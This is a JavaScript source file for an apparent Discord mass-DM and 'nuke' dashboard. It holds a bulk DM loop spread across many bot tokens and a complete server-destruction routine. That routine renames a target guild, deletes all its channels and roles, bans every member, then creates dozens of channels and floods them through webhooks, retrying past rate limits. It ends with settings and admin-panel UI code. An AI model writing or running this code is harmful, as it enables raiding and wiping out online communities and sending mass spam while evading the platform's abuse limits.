      };
      
      try {
        const chanRes = await dPost('/users/@me/channels', token, { recipient_id: uid });
        if (!chanRes.ok) {
          const b = await chanRes.json().catch(() => ({}));
          if (DM_LIMIT_CODES.has(b.code) || chanRes.status === 403) {
            flagLimited(token);
            // Don't count this user as a failure — it's the bot's fault, not the user
            done++; dmEtaDone++;
            setProgress(50 + done / total * 50);
            continue;
          }
          const reason = DISCORD_ERRORS[b.code] || b.message || '?';
          throw new Error(`open DM failed — ${reason}`);
        }
        const chan    = await chanRes.json();
        const content = applyVars(dmMessage, user);
        const msgBody = { content };
        if (useEmbed) msgBody.embeds = [getEmbedPayload()];
        const msgRes = await dPost(`/channels/${chan.id}/messages`, token, msgBody);
        if (msgRes.ok) {
          statSent++;
          if (tokenStats[token]) tokenStats[token].sent++;
          botConsecFails.set(token, 0);
          const botName = tokenMeta[token]?.username || mask(token);
          log('ok', `[✓] ${uid} | ${user.username} — via ${botName}`);
        } else {
          const b = await msgRes.json().catch(() => ({}));
          if (DM_LIMIT_CODES.has(b.code) || msgRes.status === 403) {
            flagLimited(token);
            done++; dmEtaDone++;
            setProgress(50 + done / total * 50);
            continue;
          }
          const reason = DISCORD_ERRORS[b.code] || b.message || '?';
          throw new Error(`HTTP ${msgRes.status} — ${reason}`);
        }
      } catch(e) {
        statFailed++;
        if (tokenStats[token]) tokenStats[token].failed++;
        // Only count consecutive hard failures (50007/no mutual = user pref, not bot fault)
        if (!e.message.includes('DMs closed') && !e.message.includes('no mutual server')) {
          const consec = (botConsecFails.get(token) || 0) + 1;
          botConsecFails.set(token, consec);
          if (consec >= LIMIT_THRESHOLD) {
            flagLimited(token);
          }
        } else {
          botConsecFails.set(token, 0);
        }
        log('err', `[✗] ${uid} | ${user.username} — ${e.message}`);
      }
      done++;
      dmEtaDone++;
      updateStats();
      setProgress(50 + done / total * 50);
      await sleepDM(dmDelay * 1000);
    }
  }));
}

init();

// ── Nuke ───────────────────────────────────────────────────────
let nukeRunning = false, nukeStop = false;
let nukeLog = [];
let _nukeCh = 0, _nukeRoles = 0, _nukeBans = 0, _nukeCreated = 0, _nukeSpammed = 0;

function nukeLogLine(type, msg) {
  const ts = new Date().toLocaleTimeString();
  nukeLog.push({ type, msg, ts });
  if (nukeLog.length > 2000) nukeLog.shift();
  const line = `<div class="log-line log-${type}">[${ts}] ${esc(msg)}</div>`;
  const el = document.getElementById('nuke-log');
  if (el) { el.innerHTML += line; el.scrollTop = el.scrollHeight; }
}

function setNukeStat(id, val) {
  const el = document.getElementById('nuke-stat-' + id);
  if (el) el.textContent = val;
}

function nukeToggleSpam(on) {
  const el = document.getElementById('nuke-spam-fields');
  if (el) el.style.display = on ? '' : 'none';
}

function clearNukeLog() {
  nukeLog = [];
  const el = document.getElementById('nuke-log');
  if (el) el.innerHTML = '<div class="log-line log-info">[~] cleared.</div>';
}

function exportNukeLog() {
  triggerDownload(nukeLog.map(e => `[${e.ts}] ${e.msg}`).join('\n'), `nuke-log-${Date.now()}.txt`);
}

function stopNuke() {
  nukeStop = true;
  nukeLogLine('warn', '[■] stopping...');
}

// ── Nuke config read/write ─────────────────────────────────────
function getNukeConfig() {
  return {
    deletechannels: document.getElementById('nuke-deletechannels').checked,
    deleteroles:    document.getElementById('nuke-deleteroles').checked,
    banmembers:     document.getElementById('nuke-banmembers').checked,
    createchannels: document.getElementById('nuke-createchannels').checked,
    channelname:    document.getElementById('nuke-channelname').value.trim(),
    channelcount:   parseInt(document.getElementById('nuke-channelcount').value) || 50,
    spammessage:    document.getElementById('nuke-spammessage').value,
    spamcount:      parseInt(document.getElementById('nuke-spamcount').value) || 10,
    servername:     document.getElementById('nuke-servername').value.trim(),
    webhookname:    document.getElementById('nuke-webhookname').value.trim(),
    webhookavatar:  document.getElementById('nuke-webhookavatar').value.trim(),
  };
}

function applyNukeConfig(cfg) {
  if (cfg.deletechannels !== undefined) document.getElementById('nuke-deletechannels').checked = cfg.deletechannels;
  if (cfg.deleteroles    !== undefined) document.getElementById('nuke-deleteroles').checked    = cfg.deleteroles;
  if (cfg.banmembers     !== undefined) document.getElementById('nuke-banmembers').checked     = cfg.banmembers;
  if (cfg.createchannels !== undefined) { document.getElementById('nuke-createchannels').checked = cfg.createchannels; nukeToggleSpam(cfg.createchannels); }
  if (cfg.channelname   !== undefined) document.getElementById('nuke-channelname').value   = cfg.channelname;
  if (cfg.channelcount  !== undefined) document.getElementById('nuke-channelcount').value  = cfg.channelcount;
  if (cfg.spammessage   !== undefined) document.getElementById('nuke-spammessage').value   = cfg.spammessage;
  if (cfg.spamcount     !== undefined) document.getElementById('nuke-spamcount').value     = cfg.spamcount;
  if (cfg.servername    !== undefined) document.getElementById('nuke-servername').value    = cfg.servername;
  if (cfg.webhookname   !== undefined) document.getElementById('nuke-webhookname').value   = cfg.webhookname;
  if (cfg.webhookavatar !== undefined) document.getElementById('nuke-webhookavatar').value = cfg.webhookavatar;
}

function exportNukeConfig() {
  triggerDownload(JSON.stringify(getNukeConfig(), null, 2), `nuke-config-${Date.now()}.json`);
  flashNotify('config exported');
}

function importNukeConfig() {
  const input = document.createElement('input');
  input.type = 'file'; input.accept = '.json';
  input.onchange = e => {
    const file = e.target.files[0]; if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => {
      try { applyNukeConfig(JSON.parse(ev.target.result)); flashNotify('config imported'); }
      catch { modalAlert('invalid json file.'); }
    };
    reader.readAsText(file);
  };
  input.click();
}

// ── Nuke core ──────────────────────────────────────────────────
async function startNuke() {
  if (nukeRunning) { modalAlert('nuke already running.'); return; }
  if (!tokens.length) { modalAlert('no tokens loaded.'); return; }
  const guildId = document.getElementById('nuke-guild-id').value.trim();
  if (!guildId) { modalAlert('enter a target guild id.'); return; }

  let guildName = guildId;
  for (const t of tokens) {
    try {
      const guilds = await dGet('/users/@me/guilds', t);
      const found = guilds.find(g => g.id === guildId);
      if (found) { guildName = found.name; break; }
    } catch {}
  }

  modalConfirm(`nuke "${guildName}" (${guildId})? this is irreversible.`, async () => {
    nukeRunning = true; nukeStop = false;
    _nukeCh = 0; _nukeRoles = 0; _nukeBans = 0; _nukeCreated = 0; _nukeSpammed = 0;
    ['channels','roles','bans','created','spammed'].forEach(k => setNukeStat(k, 0));
    setNukeStat('status', 'running');
    document.getElementById('nuke-log').innerHTML = '';
    nukeLog = [];

    const cfg = getNukeConfig();
    nukeLogLine('info', `[~] finding bots in ${guildId}...`);

    // find all bots that are in the target server — in parallel
    const validBots = [];
    await Promise.all(tokens.map(async (token, i) => {
      try {
        const guilds = await dGet('/users/@me/guilds', token);
        if (guilds.some(g => g.id === guildId)) {
          validBots.push({ index: i, token });
          const meta = tokenMeta[token];
          nukeLogLine('ok', `[✓] bot ${i+1} (${meta ? meta.username : mask(token)}) confirmed`);
        }
      } catch(e) { nukeLogLine('warn', `[~] bot ${i+1}: ${e.message}`); }
    }));

    if (!validBots.length) {
      nukeLogLine('err', '[✗] no bots found in the server!');
      nukeRunning = false; setNukeStat('status', 'failed'); return;
    }

    nukeLogLine('info', `[~] nuking with ${validBots.length} bot(s)...`);

    // rename server immediately (one bot)
    if (cfg.servername) {
      const { index, token } = validBots[0];
      try {
        const r = await fetch(PROXY(`${DISCORD}/guilds/${guildId}`), {
          method: 'PATCH',
          headers: { 'Content-Type': 'application/json', Authorization: `Bot ${token}` },
          body: JSON.stringify({ name: cfg.servername }),
        });
        if (r.ok) nukeLogLine('ok', `[✓] bot ${index+1}: renamed → "${cfg.servername}"`);
        else nukeLogLine('warn', `[~] bot ${index+1}: rename HTTP ${r.status}`);
      } catch(e) { nukeLogLine('err', `[✗] rename: ${e.message}`); }
    }

    // ── Phase 1: fetch shared lists once, then drain via queues across all bots ──
    let allChannels = [], allRoles = [], allMembers = [];
    const fetchBot = validBots[0].token;
    if (cfg.deletechannels) {
      try { allChannels = await dGet(`/guilds/${guildId}/channels`, fetchBot); } catch(e) { nukeLogLine('err', `[✗] fetch channels: ${e.message}`); }
    }
    if (cfg.deleteroles) {
      try {
        const roles = await dGet(`/guilds/${guildId}/roles`, fetchBot);
        allRoles = roles.filter(r => r.name !== '@everyone' && !r.managed);
      } catch(e) { nukeLogLine('err', `[✗] fetch roles: ${e.message}`); }
    }
    if (cfg.banmembers) {
      try { allMembers = await fetchGuildMembers(guildId, fetchBot); } catch(e) { nukeLogLine('err', `[✗] fetch members: ${e.message}`); }
    }

    nukeLogLine('info', `[~] deleting ${allChannels.length} channels, ${allRoles.length} roles, banning ${allMembers.length} members...`);

    // pre-assign work to each bot by index so all bots get items immediately

    // pre-assign channels to bots so the queue isn't drained by one bot
    const chSlices  = validBots.map((_, bi) => allChannels.filter((_, i) => i % validBots.length === bi));
    const roleSlices = validBots.map((_, bi) => allRoles.filter((_, i) => i % validBots.length === bi));
    const banSlices  = validBots.map((_, bi) => allMembers.filter((_, i) => i % validBots.length === bi));

    await Promise.all(validBots.map(async ({ index, token }, bi) => {
      const lbl = `bot ${index+1}`;

      // delete channels — all in parallel
      if (cfg.deletechannels && chSlices[bi].length) {
        await Promise.all(chSlices[bi].map(async ch => {
          if (nukeStop) return;
          try {
            const r = await fetch(PROXY(`${DISCORD}/channels/${ch.id}`), {
              method: 'DELETE', headers: { Authorization: `Bot ${token}` },
            });
            if (r.ok) { _nukeCh++; setNukeStat('channels', _nukeCh); }
          } catch {}
        }));
        nukeLogLine('ok', `[✓] ${lbl}: channel deletion done`);
      }

      // delete roles — all in parallel
      if (cfg.deleteroles && roleSlices[bi].length) {
        await Promise.all(roleSlices[bi].map(async role => {
          if (nukeStop) return;
          try {
            const r = await fetch(PROXY(`${DISCORD}/guilds/${guildId}/roles/${role.id}`), {
              method: 'DELETE', headers: { Authorization: `Bot ${token}` },
            });
            if (r.ok) { _nukeRoles++; setNukeStat('roles', _nukeRoles); }
          } catch {}
        }));
        nukeLogLine('ok', `[✓] ${lbl}: role deletion done`);
      }

      // ban members — all in parallel
      if (cfg.banmembers && banSlices[bi].length) {
        let selfId = null;
        try { const me = await dGet('/users/@me', token); selfId = me.id; } catch {}
        await Promise.all(banSlices[bi].filter(m => m.id !== selfId).map(async m => {
          if (nukeStop) return;
          try {
            const r = await fetch(PROXY(`${DISCORD}/guilds/${guildId}/bans/${m.id}`), {
              method: 'PUT',
              headers: { 'Content-Type': 'application/json', Authorization: `Bot ${token}` },
              body: JSON.stringify({ delete_message_seconds: 0 }),
            });
            if (r.ok || r.status === 204) { _nukeBans++; setNukeStat('bans', _nukeBans); }
          } catch {}
        }));
        nukeLogLine('ok', `[✓] ${lbl}: bans done`);
      }
    }));

    if (nukeStop || !cfg.createchannels) {
      nukeRunning = false;
      setNukeStat('status', nukeStop ? 'stopped' : 'done');
      nukeLogLine('info', `[✓] nuke ${nukeStop ? 'stopped' : 'complete'}!`);
      flashNotify(`nuke ${nukeStop ? 'stopped' : 'done'}`);
      return;
    }

    // ── Phase 2: create channels + spam — all bots in parallel, no delays ──
    nukeLogLine('info', '[~] phase 1 done — creating channels and spamming...');
    const nBots = validBots.length;
    const allChannelIdxs = Array.from({ length: cfg.channelcount }, (_, i) => i);
    // pre-slice channel slots per bot
    const spamSlices = validBots.map((_, bi) => allChannelIdxs.filter(i => i % nBots === bi));

    // retry a fetch with 429 backoff — keeps retrying until success or nukeStop
    async function fetchRetry(url, opts, maxRetries = 12) {
      for (let attempt = 0; attempt < maxRetries; attempt++) {
        if (nukeStop) return null;
        try {
          const r = await fetch(url, opts);
          if (r.status === 429) {
            let wait = 2000;
            try { const b = await r.json(); wait = ((b.retry_after || 2) * 1000) + 200; } catch {}
            nukeLogLine('warn', `[~] 429 — waiting ${(wait/1000).toFixed(1)}s (attempt ${attempt+1})`);
            await sleep(wait);
            continue;
          }
          if (r.status >= 500) { await sleep(1000); continue; }
          return r;
        } catch { await sleep(800); }
      }
      return null;
    }

    await Promise.all(validBots.map(async ({ index, token }, bi) => {
      const lbl = `bot ${index+1}`;

      await Promise.all(spamSlices[bi].map(async () => {
        if (nukeStop) return;
        try {
          // create channel
          const cr = await fetchRetry(PROXY(`${DISCORD}/guilds/${guildId}/channels`), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', Authorization: `Bot ${token}` },
            body: JSON.stringify({ name: cfg.channelname, type: 0 }),
          });
          if (!cr || !cr.ok) { nukeLogLine('warn', `[~] ${lbl}: create ch failed HTTP ${cr ? cr.status : 'null'}`); return; }
          const ch = await cr.json();
          _nukeCreated++; setNukeStat('created', _nukeCreated);

          // create webhook — retry on 429
          const wr = await fetchRetry(PROXY(`${DISCORD}/channels/${ch.id}/webhooks`), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', Authorization: `Bot ${token}` },
            body: JSON.stringify({ name: cfg.webhookname }),
          });
          if (!wr || !wr.ok) { nukeLogLine('warn', `[~] ${lbl}: webhook failed`); return; }
          const wh = await wr.json();
          const whUrl = `https://discord.com/api/webhooks/${wh.id}/${wh.token}`;

          // fire all spam simultaneously, retry each on 429
          const payload = { content: cfg.spammessage };
          if (cfg.webhookavatar) payload.avatar_url = cfg.webhookavatar;
          const spamBody = JSON.stringify(payload);

          await Promise.all(Array.from({ length: cfg.spamcount }, async () => {
            if (nukeStop) return;
            const sr = await fetchRetry(PROXY(whUrl), {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: spamBody,
            });
            if (sr && (sr.ok || sr.status === 204)) { _nukeSpammed++; setNukeStat('spammed', _nukeSpammed); }
          }));
        } catch(e) { nukeLogLine('err', `[✗] ${lbl}: ${e.message}`); }
      }));

      nukeLogLine('ok', `[✓] ${lbl}: spam done`);
    }));

    nukeRunning = false;
    setNukeStat('status', nukeStop ? 'stopped' : 'done');
    nukeLogLine('info', `[✓] nuke ${nukeStop ? 'stopped' : 'complete'}!`);
    flashNotify(`nuke ${nukeStop ? 'stopped' : 'done'}`);
  });
}
/* ===== SETTINGS CONTROLS ===== */

function changeAccentColor(color) {
  document.documentElement.style.setProperty('--accent', color);
  document.documentElement.style.setProperty('--accent2', color);
  document.documentElement.style.setProperty(
    '--accent-glow',
    color + '33'
  );

  localStorage.setItem('massdm_accent', color);

  const picker = document.getElementById('accent-color-picker');
  if (picker) picker.value = color;
}

function toggleAnimations(enabled) {
  document.documentElement.classList.toggle('reduce-motion', !enabled);
  localStorage.setItem('massdm_animations', enabled);
}

function changeGlow(value) {
  document.documentElement.style.setProperty(
    '--accent-glow',
    'rgba(124,111,247,' + (value / 100) + ')'
  );
  localStorage.setItem('massdm_glow', value);
}

function toggleCompactMode(enabled) {
  document.body.classList.toggle('compact-mode', enabled);
  localStorage.setItem('massdm_compact', enabled);
}

function toggleBackgroundMusic(enabled) {
  localStorage.setItem('massdm_music', enabled);

  const audio = document.querySelector('audio');

  if (audio) {
    if (enabled) {
      audio.play().catch(() => {});
    } else {
      audio.pause();
    }
  }
}

function changeMusicVolume(value) {
  const audio = document.querySelector('audio');

  if (audio) {
    audio.volume = value / 100;
  }

  localStorage.setItem('massdm_volume', value);
}

function resetAppearance() {
  changeAccentColor('#7c6ff7');

  const animations = document.getElementById('animations-toggle');
  const glow = document.getElementById('glow-intensity');

  if (animations) {
    animations.checked = true;
    toggleAnimations(true);
  }

  if (glow) {
    glow.value = 50;
    changeGlow(50);
  }
}

function resetAllSettings() {
  if (!confirm('Reset all dashboard settings?')) return;

  localStorage.removeItem('massdm_accent');
  localStorage.removeItem('massdm_animations');
  localStorage.removeItem('massdm_glow');
  localStorage.removeItem('massdm_compact');
  localStorage.removeItem('massdm_music');
  localStorage.removeItem('massdm_volume');
  localStorage.removeItem('rememberPage');
  localStorage.removeItem('notifications');

  location.reload();
}
// Token checker progress UI
function showCheckerProgress(percent, text = 'checking...') {
  const wrap = document.getElementById('checker-progress');
  const fill = document.getElementById('checker-progress-fill');
  const percentEl = document.getElementById('checker-progress-percent');
  const textEl = document.getElementById('checker-progress-text');

  if (!wrap || !fill) return;

  wrap.style.display = 'block';
  fill.style.width = Math.max(0, Math.min(100, percent)) + '%';
  percentEl.textContent = Math.round(percent) + '%';
  textEl.textContent = text;
}

function hideCheckerProgress() {
  const wrap = document.getElementById('checker-progress');
  if (wrap) wrap.style.display = 'none';
}
// =========================
// ADMIN PANEL
// =========================

const ADMIN_USER_ID = "1550556444292550728";

let adminServers = [];

function openAdminPanel(userId) {
  if (userId !== ADMIN_USER_ID) {
    alert("Access denied.");
    return;
  }

  const panel = document.getElementById("adminPanel");

  if (panel) {
    panel.style.display = "block";
    loadAdminData();
  }
}

function closeAdminPanel() {
  const panel = document.getElementById("adminPanel");
  if (panel) {
    panel.style.display = "none";
  }
}

async function loadAdminData() {
  try {
    const response = await fetch("/api/admin/servers");

    if (!response.ok) {
      throw new Error("Failed to load servers");
    }

    adminServers = await response.json();

    updateAdminStats();
    filterAdminServers();

  } catch (error) {
    console.error("Admin data error:", error);
  }
}

function updateAdminStats() {
  const total = adminServers.length;

  const verified = adminServers.filter(
    server => server.verified
  ).length;

  const members = adminServers.reduce(
    (sum, server) =>
      sum + (server.approximate_member_count || 0),
    0
  );

  const totalEl = document.getElementById("adminTotalServers");
  const verifiedEl = document.getElementById("adminVerifiedServers");
  const membersEl = document.getElementById("adminActiveUsers");

  if (totalEl) totalEl.textContent = total.toLocaleString();
  if (verifiedEl) verifiedEl.textContent = verified.toLocaleString();
  if (membersEl) membersEl.textContent = members.toLocaleString();
}

function filterAdminServers() {
  const searchEl = document.getElementById("adminSearch");
  const filterEl = document.getElementById("adminFilter");
  const sortEl = document.getElementById("adminSort");

  if (!searchEl || !filterEl || !sortEl) return;

  const search = searchEl.value.toLowerCase().trim();
  const filter = filterEl.value;
  const sort = sortEl.value;

  let list = [...adminServers];

  if (filter === "verified") {
    list = list.filter(server => server.verified);
  }

  if (filter === "unverified") {
    list = list.filter(server => !server.verified);
  }

  if (search) {
    list = list.filter(server =>
      (server.name || "").toLowerCase().includes(search)
    );
  }

  if (sort === "members-desc") {
    list.sort((a, b) =>
      (b.approximate_member_count || 0) -
      (a.approximate_member_count || 0)
    );
  }

  if (sort === "members-asc") {
    list.sort((a, b) =>
      (a.approximate_member_count || 0) -
      (b.approximate_member_count || 0)
    );
  }

  if (sort === "name-asc") {
    list.sort((a, b) =>
      (a.name || "").localeCompare(b.name || "")
    );
  }

  if (sort === "name-desc") {
    list.sort((a, b) =>
      (b.name || "").localeCompare(a.name || "")
    );
  }

  renderAdminServers(list);
}

function renderAdminServers(list) {
  const container = document.getElementById("adminServerList");

  if (!container) return;

  if (!list.length) {
    container.innerHTML = `
      <div style="padding:40px;text-align:center;opacity:.5">
        No servers found.
      </div>
    `;
    return;
  }

  container.innerHTML = list.map(server => `
    <div class="admin-server">

      <div class="admin-server-info">

        <img
          class="admin-server-icon"
          src="${server.icon || "https://cdn.discordapp.com/embed/avatars/0.png"}"
        >

        <div>
          <div class="admin-server-name">
            ${escapeAdminHTML(server.name || "Unknown Server")}
          </div>

          <div class="admin-server-meta">
            ${(server.approximate_member_count || 0).toLocaleString()} members
            ${server.id ? " • " + server.id : ""}
          </div>
        </div>

      </div>

      ${
        server.verified
          ? '<span class="admin-verified">✓ Verified</span>'
          : '<span class="admin-unverified">Unverified</span>'
      }

    </div>
  `).join("");
}

function escapeAdminHTML(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}